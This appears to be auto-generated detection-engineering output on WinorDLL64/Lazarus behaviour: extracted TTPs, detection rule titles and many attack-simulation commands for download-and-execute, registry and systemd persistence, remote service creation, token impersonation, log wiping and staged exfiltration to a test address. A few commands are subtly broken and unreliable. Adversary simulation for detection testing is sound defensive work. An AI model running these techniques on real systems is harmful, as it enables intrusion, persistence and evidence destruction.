extracted_ttps.description: Attacker potentially used PowerShell for execution, as indicated by the detection of the PowerShell tool
WinorDLL64 instructs the PowerShell interpreter to run unrestricted and to read commands from standard input
WinorDLL64 can execute further processes using the CreateProcessW and CreateProcessAsUserW APIs
The loader uses the MemoryModule library to load modules directly from memory, indicating potential malicious behavior through user execution
Detected tools include Net, PowerShell, and Reg, suggesting the use of command and scripting interpreters for malicious purposes
The loader is virtualized by Oreans’ Code Virtualizer, a commercial protector, indicating an attempt to obfuscate files or information
The WinorDLL64 payload communicates over a connection established by the Wslink loader, potentially using remote services.
The WinorDLL64 payload executes additional commands, suggesting the use of a command and scripting interpreter.
Overlap in code and behavior with known Lazarus samples may indicate file and directory discovery
WinorDLL64 can call APIs WTSQueryUserToken and CreateProcessAsUserW to create a process under an impersonated user
The detection of 'Reg' as a tool may indicate registry modification for persistence
Detected PowerShell activity via NLP pattern matching
The Wslink downloader is executed on the system, potentially through user interaction.
The WinorDLL64 payload can remove files, potentially as a means to evade detection.
Victimology suggests South Korean victims, which may indicate targeted user execution
WinorDLL64 securely removes temporary files after sending them to the operator
The WinorDLL64 payload acquires extensive system information.
WinorDLL64 communicates over a TCP connection
Detected Create or Modify System Process activity via NLP pattern matching
WinorDLL64 acquires extensive system information
WinorDLL64 executes additional commands
WinorDLL64 can execute arbitrary PowerShell commands
WinorDLL64 can securely remove arbitrary files
Detected Exfiltration Over C2 Channel activity via NLP pattern matching
Detected Exploit Public-Facing Application activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching
Detected Account Discovery activity via NLP pattern matching
Detected Registry Run Keys activity via NLP pattern matching
Detected Remote Desktop Protocol activity via NLP pattern matching

rules.title: PowerShell Execution Detection
rules.description: Detects the use of PowerShell for execution, as indicated by the detection of the PowerShell tool

rules.title: Native API Execution via CreateProcessW and CreateProcessAsUserW
rules.description: Detects the use of Native API to execute processes using CreateProcessW and CreateProcessAsUserW
falsepositives: System processes like services.exe or svchost.exe may use these APIs for legitimate purposes
Trusted applications like installers or system utilities may use these APIs

rules.title: Detection of Malicious User Execution via MemoryModule and Code Virtualizer
rules.description: Identifies potential malicious behavior through user execution using the MemoryModule library to load modules directly from memory
falsepositives: Legitimate software development or debugging tools using MemoryModule or Code Virtualizer
False positives may occur if legitimate software uses these libraries for non-malicious purposes

rules.title: Command and Scripting Interpreter Detection
rules.description: Detects the use of command and scripting interpreters for malicious purposes, such as Net, PowerShell, and Reg

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Obfuscated Files or Information via Code Virtualizer
rules.description: Detects the use of Code Virtualizer, a commercial protector, to obfuscate files or information, indicating an attempt to evade defense mechanisms
falsepositives: Legitimate software development or protection activities using Code Virtualizer

rules.title: Remote Services Detection via WinorDLL64 and Wslink
rules.description: Detects the use of remote services by the WinorDLL64 payload and Wslink loader, indicating potential lateral movement
falsepositives: Legitimate software updates or remote administration tools using similar DLLs or loaders

rules.title: File and Directory Discovery by Lazarus Samples
rules.description: Detects file and directory discovery using Lazarus samples

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Access Token Manipulation via WTSQueryUserToken and CreateProcessAsUserW
rules.description: Detects the use of WTSQueryUserToken and CreateProcessAsUserW APIs to manipulate access tokens and create processes under impersonated users, as used by WinorDLL64

rules.title: Modify Registry via Reg.exe
rules.description: Detects the use of reg.exe to modify the registry, which can be used for persistence

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: PowerShell Execution Detection
rules.description: Detects PowerShell execution activity via NLP pattern matching

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detection: Indicator Removal on Host
rules.description: The WinorDLL64 payload can remove files, potentially as a means to evade detection.

rules.title: WinorDLL64 Detection
rules.description: Detects the WinorDLL64 payload acquiring extensive system information
falsepositives: False positives may occur if WinorDLL64.dll is used for legitimate purposes

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Create or Modify System Process Detection
rules.description: Detects Create or Modify System Process activity via NLP pattern matching
falsepositives: Legitimate system processes using powershell.exe or cmd.exe
Administrative tasks using similar command lines

attacks.description: Basic PowerShell command writing a test string to a file in the temp directory.
attacks.expected_behavior: Creates a file 'test_exec.txt' in the user's temp directory with the content 'Test execution via PowerShell'. No elevated privileges required.

attacks.description: Intermediate: Execute a Base64-encoded PowerShell command that calls [int]::GetTickCount() to simulate benign encoded command execution.
attacks.expected_behavior: Runs an encoded PowerShell command that outputs the system uptime in milliseconds. The Base64 string decodes to '[int]::GetTickCount()' using UTF-16LE encoding. No file written, minimal footprint.

attacks.command: certutil.exe -urlcache -f http://127.0.0.1/script.ps1 $env:TEMP\\dl.ps1 2>&1 > $null; if (Test-Path $env:TEMP\\dl.ps1) { powershell -ExecutionPolicy Bypass -File $env:TEMP\\dl.ps1; Remove-Item $env:TEMP\\dl.ps1 -ErrorAction SilentlyContinue }
attacks.description: Advanced: Simulate downloading a script via certutil (local loopback for safety), executing it, and cleaning up. Uses PowerShell for execution.
attacks.expected_behavior: Attempts to download 'script.ps1' from localhost (likely fails safely), checks if file exists, executes it if present, then deletes it. Uses built-in certutil for download and PowerShell for execution. Cleanup uses -ErrorAction SilentlyContinue to avoid errors if file is missing.

attacks.command: pwsh -Command "Write-Output 'Test execution via PowerShell on Linux'"
attacks.description: Basic execution of PowerShell to output a test message, simulating initial access or command execution.
attacks.expected_behavior: Prints 'Test execution via PowerShell on Linux' to stdout and exits cleanly.

attacks.description: Intermediate: Simulates downloading and executing a script from a local web server, using .NET WebClient for stealth.
attacks.expected_behavior: Attempts to download a string from http://127.0.0.1:8000/payload.txt and execute it. Fails silently if unreachable. No payload is actually harmful.

attacks.command: pwsh -Command "mkdir -Path '/tmp/.pscache' -ErrorAction SilentlyContinue; $payload = 'Write-Output \"Beacon triggered at $(Get-Date)\"'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)); $outPath = '/tmp/.pscache/cache.ps1'; $payload | Out-File -Path $outPath -Force; Start-Process pwsh -ArgumentList '-EncodedCommand', $encoded -WindowStyle Hidden"
attacks.description: Advanced: Simulates staged execution by writing a script to a hidden temp directory, encoding a command, and executing it in a hidden window.
attacks.expected_behavior: Creates a hidden directory in /tmp, writes a benign script, encodes a message command, and executes it in a hidden PowerShell window. Leaves minimal trace.

attacks.description: Basic use of cmd to launch calculator via 'start', which invokes CreateProcess internally.
attacks.expected_behavior: Calculator application (calc.exe) opens. This is a benign process launch using built-in shell command.

attacks.description: Intermediate method using rundll32 to execute Notepad via ShellExec_RunDLL, leveraging native API indirectly.
attacks.expected_behavior: Notepad opens. rundll32 is a legitimate Windows binary used to call functions from DLLs, commonly abused in attacks.

attacks.description: Advanced method using PowerShell to encode and execute calc.exe via Start-Process, simulating obfuscated execution.
attacks.expected_behavior: A new PowerShell process decodes and launches calculator. Demonstrates indirect process creation with encoding, mimicking stealthy execution techniques.

attacks.description: Basic execution of a process using cmd.exe to launch calc.exe via the start command, simulating simple process creation through native shell.
attacks.expected_behavior: Calculator application (calc.exe) is launched in a new process window.

attacks.description: Intermediate process creation using PowerShell's Start-Process cmdlet to launch notepad with a specific file argument, simulating parameterized execution via native API.
attacks.expected_behavior: Notepad opens with a blank file named 'test.txt' in the user's TEMP directory.

attacks.command: powershell -Command "mkdir '$env:TEMP\_tmp' -ErrorAction SilentlyContinue; $fp = '$env:TEMP\_tmp\payload.bat'; Set-Content -Path $fp -Value 'echo Simulated payload & exit' -Force; Start-Process $fp -WindowStyle Hidden"
attacks.description: Advanced simulation involving file creation and hidden execution of a batch script using PowerShell, modeling stealthy process launch via native APIs.
attacks.expected_behavior: A hidden command window runs a benign batch script from a temporary subdirectory, then exits. No visible window remains.

attacks.description: Basic user execution via cmd.exe launching a legitimate Windows binary (calc.exe) to simulate user-driven execution behavior.
attacks.expected_behavior: Calculator application launches. Demonstrates basic execution via command line, simulating user-driven launch of a binary.

attacks.description: Intermediate fileless execution using Base64-encoded command in PowerShell to simulate in-memory execution of a payload (here, launching calc.exe).
attacks.expected_behavior: PowerShell decodes and executes 'calc.exe' via IEX. No file is written to disk. Simulates encoded in-memory execution technique commonly seen in user execution attacks.

attacks.command: powershell -Command "try { $content = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAWAAAAAAAAAAAgAAAAAAAgAAAAAAAuAAAAAAACAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); $path = '$env:TEMP\\test.bin'; [System.IO.File]::WriteAllBytes($path, $content); start $path } catch { } finally { Remove-Item $path -ErrorAction SilentlyContinue }"
attacks.description: Advanced simulation of memory module loading: writes a benign binary stub (MZ header) to temp, executes it, then deletes it to mimic transient in-memory module use.
attacks.expected_behavior: Creates a temporary binary file containing a minimal MZ stub (non-functional but structurally valid), executes it (will likely fail safely), then removes it. Simulates loader behavior while minimizing risk.

attacks.description: Adds a new local user account using the built-in net.exe command.
attacks.expected_behavior: Creates a new local user named 'attacker' with the specified password. Requires administrator privileges. Visible in local user accounts.

attacks.description: Downloads and executes a remote PowerShell script using WebClient.
attacks.expected_behavior: Attempts to download and execute a script from a local IP. Will fail if server is unreachable. No payload is active; used to test detection of script download and execution patterns.

attacks.description: Adds a persistence entry in the current user's registry run key to execute a command at login.
attacks.expected_behavior: Modifies the current user's Run key to execute a harmless command on login. Creates a file 'autorun.txt' in %TEMP% on next login. Does not require admin rights.

attacks.description: Creates a Base64‑encoded script that echoes a message, decodes it to a temporary file, makes it executable, and runs it.
attacks.expected_behavior: Outputs 'Hello world!' to the console.

attacks.command: printf 'ZWNobyAiU2VjcmV0IGRhdGEiCg==' | base64 -d > /tmp/script.sh && openssl enc -aes-256-cbc -salt -in /tmp/script.sh -out /tmp/script.enc -pass pass:MyPass && rm /tmp/script.sh && openssl enc -d -aes-256-cbc -in /tmp/script.enc -pass pass:MyPass | bash
attacks.description: Encodes a script with Base64, encrypts it using OpenSSL AES‑256‑CBC, deletes the plaintext, then decrypts and pipes it directly to bash for execution.
attacks.expected_behavior: Outputs 'Secret data' to the console.

attacks.description: Builds a command string from hex‑escaped characters (representing an echo statement) and executes it via eval, hiding the clear‑text command until runtime.
attacks.expected_behavior: Outputs 'Advanced command' to the console.

attacks.description: Starts the WinRM service on a remote host using sc.exe, simulating use of remote services for lateral movement.
attacks.expected_behavior: Attempts to start the WinRM service on REMOTE-HOST. Requires network connectivity and administrative privileges. Fails silently if service does not exist or access is denied.

attacks.command: net use \\REMOTE-HOST\IPC$ /user:DOMAIN\User * && sc \\REMOTE-HOST create BackSVC binPath= "cmd.exe /c notepad.exe" start= auto && sc \\REMOTE-HOST start BackSVC
attacks.description: Establishes an authenticated session via IPC$, then creates and starts a service on a remote host using net.exe and sc.exe.
attacks.expected_behavior: Connects to REMOTE-HOST using provided credentials, creates a service named 'BackSVC' that runs notepad.exe, sets it to auto-start, and executes it. Leaves minimal disk footprint. Service will be removed upon reboot unless deleted.

attacks.description: Uses wmic.exe via PowerShell to remotely create a process on a target system, simulating remote service execution.
attacks.expected_behavior: Executes notepad.exe on REMOTE-HOST using WMI, a common remote services technique. WMI uses DCOM/RPC and authenticates with provided credentials. Process runs in user context on remote system.

attacks.description: Basic use of SSH to execute a benign command on a remote host, demonstrating lateral movement via a remote service.
attacks.expected_behavior: The remote host creates /tmp/remote_test.txt containing the string "test from remote".

attacks.command: echo 'echo "payload executed" > /tmp/payload_output.txt' > /tmp/payload.sh && scp /tmp/payload.sh user@192.168.1.10:/tmp/ && ssh user@192.168.1.10 'chmod +x /tmp/payload.sh && /tmp/payload.sh'
attacks.description: Intermediate scenario: creates a simple script locally, copies it to the remote host with SCP, then runs it via SSH, showing use of multiple remote services.
attacks.expected_behavior: The script is transferred to the remote host, executed, and creates /tmp/payload_output.txt containing "payload executed".

attacks.command:
echo -e '[Unit]
Description=Test Service
[Service]
ExecStart=/bin/sleep 60
[Install]
WantedBy=multi-user.target' | sudo tee /etc/systemd/system/test.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable --now test.service
attacks.description: Advanced technique: uses administrative privileges to create a systemd service that runs a benign command, illustrating how attackers can leverage remote service management for persistence and lateral movement.
attacks.expected_behavior: A new systemd unit named test.service is created, enabled, and started, executing 'sleep 60' as a background process.

attacks.description: Basic file discovery: lists the names of files and folders in the current user's AppData directory.
attacks.expected_behavior: The command outputs a simple list of entries (one per line) present in %APPDATA%.

attacks.description: Intermediate discovery: enumerates driver files in the System32\drivers folder and shows each file's name and size.
attacks.expected_behavior: PowerShell prints a table with the Name and Length columns for each driver file found.

attacks.description: Advanced discovery: iterates over common drive letters and lists top‑level directories on each drive.
attacks.expected_behavior: For each existing drive (C:, D:, E:), the command outputs the names of directories located directly under the root of that drive.

attacks.command: powershell -Command "try { $sig = '[DllImport(\'wtsapi32.dll\')] public static extern bool WTSQueryUserToken(uint SessionId, out IntPtr phToken);'; $WTS = Add-Type -MemberDefinition $sig -Name 'WTS' -Namespace 'Win32' -PassThru; $hToken = [IntPtr]::Zero; if ($WTS::WTSQueryUserToken(1, [ref]$hToken)) { Start-Process -FilePath 'cmd.exe' -ArgumentList '/c echo Running as impersonated user & whoami' -Verb RunAs } } catch { Write-Error $_.Exception.Message }"
attacks.description: Basic access token manipulation using WTSQueryUserToken to obtain a user token and launch a process.
attacks.expected_behavior: Queries the user token from session 1, if accessible, and attempts to start a process using that token. Fails if not running with sufficient privileges.

attacks.description: Intermediate: Base64-encoded PowerShell command to query user token from session 1 and start a process as that user, simulating obfuscation.
attacks.expected_behavior: Decodes and executes a PowerShell script that calls WTSQueryUserToken to get a token from session 1 and launches cmd.exe under that context if successful. Fails silently without proper privileges.

attacks.command: powershell -Command "try { $source = @' using System; using System.Diagnostics; using System.Runtime.InteropServices; [DllImport(\"wtsapi32.dll\", SetLastError = true)] public static extern bool WTSQueryUserToken(uint SessionId, out IntPtr phToken); [DllImport(\"advapi32.dll\", SetLastError = true)] public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation); [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; } [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; } class Program { static void Main() { IntPtr hToken; if (WTSQueryUserToken(1, out hToken)) { STARTUPINFO si = new STARTUPINFO(); si.cb = (uint)Marshal.SizeOf(si); PROCESS_INFORMATION pi; CreateProcessAsUser(hToken, \"cmd.exe\", \"/c echo Child process launched & whoami\", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, null, ref si, out pi); } } } '@; Add-Type -TypeDefinition $source -Language CSharp; [Program]::Main() } catch { Write-Error $_.Exception.Message }"
attacks.description: Advanced: Compiles and executes C# code in memory to perform access token manipulation via WTSQueryUserToken and CreateProcessAsUserW.
attacks.expected_behavior: Compiles a C# program in memory that queries a user token from session 1 and creates a new process under that user's context using CreateProcessAsUserW. Expected to fail without SYSTEM-level privileges.

attacks.description: Adds a registry entry to execute a benign command at user logon using reg.exe
attacks.expected_behavior: Registry key 'TestKey' is added under HKCU\Software\Microsoft\Windows\CurrentVersion\Run with value 'cmd.exe /c echo test'. The command will execute when the user logs in.

attacks.description: Uses PowerShell to set a registry value for persistence in the current user's Run key
attacks.expected_behavior: Registry key 'TestPSKey' is created or modified under HKCU Run key with command value. Executes on user login.

attacks.command: powershell -Command "$cmd = 'cmd.exe /c echo encoded_test'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EncodedTest" /t REG_SZ /d "powershell -EncodedCommand $encoded" /f"
attacks.description: Adds a registry entry with an encoded PowerShell command to simulate stealthy persistence
attacks.expected_behavior: Registry key 'EncodedTest' is added under HKCU Run key, containing a Base64-encoded command that executes 'echo encoded_test' at login. Simulates obfuscated persistence.

attacks.command: wine reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersistence /t REG_SZ /d "echo Hello > $HOME/test.txt" /f
attacks.description: Adds a Run registry entry for the current user that creates a test file, demonstrating basic registry modification for persistence.
attacks.expected_behavior: A new value named 'TestPersistence' is created under HKCU\...\Run. When the simulated Windows environment reads this key, it would execute the echo command, resulting in $HOME/test.txt being created.

attacks.command: sudo wine reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysMon /t REG_SZ /d "/usr/bin/touch /tmp/persist" /f
attacks.description: Adds a Run entry in the HKLM hive, requiring root, to simulate system-wide persistence.
attacks.expected_behavior: A new value named 'SysMon' is created under HKLM\...\Run. If the Windows environment processes this key, it would create /tmp/persist, indicating successful privileged registry modification.

attacks.command: echo -e "Windows Registry Editor Version 5.00\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"AutoStart\"=\"/usr/bin/echo persisted\"" > /tmp/persistence.reg && wine reg import /tmp/persistence.reg
attacks.description: Creates a .reg file with multiple Run entries and imports it, demonstrating an advanced persistence technique.
attacks.expected_behavior: The .reg file is written to /tmp/persistence.reg and then imported. Two values, 'AutoStart' (and any others added), appear under the Run key. The associated command would echo 'persisted' when executed, confirming the import succeeded.

attacks.description: Basic command to execute a simple PowerShell script that gets the current date
attacks.expected_behavior: The command will output the current date and time.

attacks.description: Intermediate command that uses an encoded command to print 'Hello World'
attacks.expected_behavior: The command will output 'Hello World'.

attacks.description: Advanced command that imports a PowerShell module and executes a function from it
attacks.expected_behavior: The command will output information about the PSUtilities module if it is installed.

attacks.description: Delete a specific log file silently using legacy command syntax.
attacks.expected_behavior: Deletes the file 'suspicious_log.txt' in the user's TEMP directory if it exists; runs silently without prompting.

attacks.description: Use PowerShell to forcefully remove multiple files, including hidden or read-only ones, with error suppression.
attacks.expected_behavior: Attempts to delete two files in TEMP and APPDATA directories; uses Force to override attributes and SilentlyContinue to avoid errors if files are missing or locked.

attacks.description: Basic removal of a user‑level temporary indicator file using rm.
attacks.expected_behavior: The specified file is deleted if it exists; no output is produced on success.

attacks.description: Intermediate secure deletion of a file by overwriting it before removal.
attacks.expected_behavior: The file is overwritten with random data and then removed, making recovery difficult.

attacks.description: Advanced removal of multiple indicator log files across /var/log using find and rm.
attacks.expected_behavior: All files matching the pattern indicator_*.log under /var/log are deleted; errors for missing files are suppressed.

attacks.description: Basic system information gathering using built-in systeminfo binary
attacks.expected_behavior: Displays detailed system information including OS version, hotfixes, network configuration, and system uptime

attacks.command: ipconfig /all & net user & net localgroup administrators & systeminfo > %TEMP%\sys_report.txt 2>&1
attacks.description: Intermediate data collection: gathers network config, user accounts, admin group members, and system info into a file
attacks.expected_behavior: Runs multiple discovery commands and saves output to %TEMP%\sys_report.txt. File may include network details, local users, and system configuration

attacks.command: cmd.exe /c "echo Gathering system data... && mkdir %TEMP%\sysdata -ErrorAction SilentlyContinue 2>&1 && systeminfo > %TEMP%\sysdata\systeminfo.txt && ipconfig /all > %TEMP%\sysdata\ipconfig.txt && net user > %TEMP%\sysdata\users.txt && netstat -ano > %TEMP%\sysdata\netstat.txt && powershell -Command \"Compress-Archive -Path %TEMP%\\sysdata\* -DestinationPath %TEMP%\\sysdata.zip -Force\" && del /Q %TEMP%\sysdata\* && rmdir %TEMP%\sysdata -ErrorAction SilentlyContinue"
attacks.description: Advanced: collects multiple system artifacts, compresses them into a ZIP file, and cleans up directory (PowerShell used only for compression)
attacks.expected_behavior: Creates a directory in %TEMP% to store system data, gathers multiple system details, compresses them into sysdata.zip, and removes the original directory. Final archive remains for exfiltration simulation.

attacks.description: Creates a scheduled task that runs notepad.exe at user logon with SYSTEM privileges using built-in schtasks.exe
attacks.expected_behavior: A scheduled task named 'Updater' is created and will execute notepad.exe each time a user logs on. Visible in Task Scheduler and via 'schtasks /query'.

attacks.description: Creates a Windows service named 'SupportService' that runs calc.exe at startup using sc.exe
attacks.expected_behavior: A new service 'SupportService' is registered in the Service Control Manager and set to start automatically. It will attempt to run calc.exe on system boot. Can be viewed via 'sc query SupportService' or Services.msc.

attacks.command: powershell -Command "mkdir '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' -ErrorAction SilentlyContinue; Set-Content -Path '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launcher.bat' -Value '@echo off\nnotepad.exe' -Force"
attacks.description: Creates a batch script in the user's Startup folder to launch notepad.exe on login using PowerShell
attacks.expected_behavior: A batch file 'launcher.bat' is placed in the current user's Startup folder. The next time the user logs in, notepad.exe will be launched silently. This persists per-user and does not require admin rights.

attacks.description: Creates a simple script in the user's home directory and registers it to run at boot via a user crontab entry.
attacks.expected_behavior: On the next system reboot, the script will execute and sleep for 60 seconds, demonstrating persistence via cron.

attacks.command:
sudo bash -c 'cat <<EOF > /etc/systemd/system/persist.service
[Unit]
Description=Root persistence service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/touch /var/log/.persisted_root

[Install]
WantedBy=multi-user.target
EOF' && sudo systemctl daemon-reload && sudo systemctl enable persist.service && sudo systemctl start persist.service
attacks.description: Creates a system‑wide systemd unit file that runs as root and creates a hidden file in /var/log, then enables and starts the service.
attacks.expected_behavior: The service starts immediately and will be launched on every boot, leaving /var/log/.persisted_root as evidence of execution.

attacks.description: Basic file deletion using legacy cmd del with quiet and force flags
attacks.expected_behavior: Deletes the file debug.log in the user's TEMP directory if it exists, without prompting

attacks.description: Intermediate file removal using PowerShell with force and error suppression
attacks.expected_behavior: Removes appcache.tmp from TEMP directory silently, even if file is read-only

attacks.description: Advanced: Simulates secure deletion by overwriting file content before removal using certutil and PowerShell
attacks.expected_behavior: Generates a zero-filled file using certutil, 'overwrites' sensitive.txt content (simulated), then securely deletes it

attacks.description: Basic removal of a test indicator file using the standard rm command.
attacks.expected_behavior: The file /tmp/indicator.txt is deleted if it exists; no output on success.

attacks.description: Securely overwrite the test file three times before unlinking it, using shred.
attacks.expected_behavior: The file /tmp/secret.log is overwritten with random data three times and then removed; shred prints progress to stdout.

attacks.command: dd if=/dev/zero of=/tmp/indicator.txt bs=1M count=10 status=none && sync && rm -f /tmp/indicator.txt
attacks.description: Overwrite the indicator file with zeros (10 MiB), force a disk sync, then delete the file for thorough sanitization.
attacks.expected_behavior: The file /tmp/indicator.txt is filled with zero bytes, data is flushed to disk, and the file is subsequently removed; no output unless an error occurs.

attacks.description: Compresses a sample file and encodes the archive to Base64 for staging before exfiltration.
attacks.expected_behavior: Creates sample.zip and sample.b64 in the %TEMP% directory.

attacks.description: Reads the Base64 file and sends its contents to a remote HTTP listener via a GET request, simulating exfiltration over a C2 channel.
attacks.expected_behavior: Issues an HTTP GET request to 10.0.0.5 with the data encoded in the query string.

attacks.description: Opens a TCP connection to a C2 server and streams the raw compressed file directly over the socket.
attacks.expected_behavior: Establishes a TCP connection to 10.0.0.5:4444 and transmits the contents of sample.zip.

attacks.description: Simulate an HTTP request to a potentially vulnerable public-facing application with a specific User-Agent header.
attacks.expected_behavior: The command should send an HTTP request to the specified URL with the given User-Agent header, potentially triggering vulnerability exploitation detection mechanisms.

attacks.description: Simulate an HTTP request to a potentially vulnerable API endpoint with an Accept header set to application/json.
attacks.expected_behavior: The command should download the content from the specified URL, potentially triggering detection mechanisms for API exploitation.

attacks.command:
nc example.com 80 << EOF
GET /vuln_path HTTP/1.1
Host: example.com
EOF
attacks.description: Use netcat to send a crafted HTTP request to a potentially vulnerable path on a public-facing application.
attacks.expected_behavior: The command should establish a connection to the specified host and port, send the crafted HTTP request, and potentially trigger detection mechanisms for vulnerability exploitation.

attacks.description: Compress a single test file into a zip archive using PowerShell's built‑in Compress-Archive cmdlet.
attacks.expected_behavior: Creates archive.zip in the %TEMP% directory containing test.txt.

attacks.description: Archive two log files into a cabinet (.cab) file using the legacy makecab utility.
attacks.expected_behavior: Creates collection.cab in the %TEMP% directory containing file1.log and file2.log.

attacks.description: Create a compressed tar.gz archive of a folder named 'collected_folder' located in %TEMP% using the native tar.exe.
attacks.expected_behavior: Generates collected_data.tar.gz in %TEMP% containing the contents of the collected_folder directory.

attacks.description: List all local user accounts on the system using the legacy net.exe binary.
attacks.expected_behavior: Outputs a list of local user accounts, including built-in accounts like Administrator and Guest. No changes are made to the system.

attacks.description: Enumerate all local groups on the system using net.exe.
attacks.expected_behavior: Displays a list of local groups such as Administrators, Users, and Guests. This helps an attacker understand privilege boundaries. No system changes occur.

attacks.command: powershell -Command "Get-CimInstance -ClassName Win32_UserAccount | Select-Object Name, Domain, SID, Disabled | Format-Table -AutoSize"
attacks.description: Use PowerShell to query detailed user account information via WMI/CIM, including domain, SID, and disabled status.
attacks.expected_behavior: Retrieves a detailed list of user accounts (local and domain) with their Name, Domain, SID, and Disabled status. This provides richer data than 'net user'. No modifications are made to the system.

attacks.description: Adds a value to the current user's Run registry key to launch calc.exe on login using reg.exe.
attacks.expected_behavior: Registry key 'TestPersistence' is added under HKCU\Software\Microsoft\Windows\CurrentVersion\Run pointing to calc.exe. Calculator will launch on next user logon.

attacks.description: Uses PowerShell to set a registry Run key for the current user to execute notepad.exe at login.
attacks.expected_behavior: Registry value 'Updater' is created in HKCU Run key. Notepad will launch when the user logs in.

attacks.description: Writes a registry Run key value that executes an encoded PowerShell command to launch calc.exe.
attacks.expected_behavior: Registry value 'EncodedRun' is added to HKCU Run key with a Base64-encoded PowerShell command. Calculator will launch on next user logon via decoded command.

attacks.description: Adds a Run registry entry under the current user to launch Notepad at logon.
attacks.expected_behavior: The registry key is created; Notepad will automatically start the next time the user logs in.

attacks.command: echo @echo off > "%TEMP%\persist.bat" && echo echo Hello World ^> "%TEMP%\hello.txt" >> "%TEMP%\persist.bat" && reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v PersistScript /t REG_SZ /d "\"%TEMP%\\persist.bat\"" /f
attacks.description: Creates a batch file in %TEMP% that writes 'Hello World' to a file, then adds an HKLM Run key to execute the batch at logon.
attacks.expected_behavior: A batch script is written to %TEMP% and a system-wide Run registry entry is added; the script runs at the next system logon, creating %TEMP%\hello.txt with the text 'Hello World'.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HiddenPS /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -Command \"New-Item -Path $env:TEMP -Name secret.txt -ItemType File -Force; Set-Content -Path $env:TEMP\\secret.txt -Value 'persistence' -Force\"" /f
attacks.description: Adds a Run entry under HKCU that launches PowerShell in hidden mode to create a hidden file with a marker string.
attacks.expected_behavior: A Run registry key is created; at the next user logon, PowerShell runs silently, creating %TEMP%\secret.txt containing the text 'persistence'.

attacks.description: Initiate RDP connection to a remote host using IP address
attacks.expected_behavior: Launches Remote Desktop Connection client and attempts to connect to 192.168.1.100 over RDP. No actual connection is made unless host is reachable and credentials provided interactively.

attacks.description: Initiate full-screen RDP connection to a non-standard port
attacks.expected_behavior: Launches RDP client in full-screen mode connecting to port 3390 on 192.168.1.100. This simulates use of alternate ports for RDP, a common evasion technique. Connection attempt fails silently if host/port is unreachable.

attacks.description: Use cmd to echo and launch RDP connection to a hostname via start command
attacks.expected_behavior: Echoes the command string, then uses 'start' to launch RDP to internal-host.local. Demonstrates indirect invocation of mstsc.exe through shell commands, which may bypass simple command-line monitoring.

attacks.description: Basic RDP connection attempt to a remote host with specified username
attacks.expected_behavior: Initiates an RDP session to 192.168.1.100 using the username 'admin'. The user will be prompted for a password interactively.

attacks.description: Intermediate RDP connection with embedded credentials
attacks.expected_behavior: Connects to 192.168.1.100 using username 'admin' and password 'Password123' without prompting. This simulates credential reuse in lateral movement.

attacks.description: Advanced RDP connection with local drive redirection
attacks.expected_behavior: Establishes RDP session with access to the local '/home/user' directory as a network share within the remote session, simulating data access or exfiltration capability.
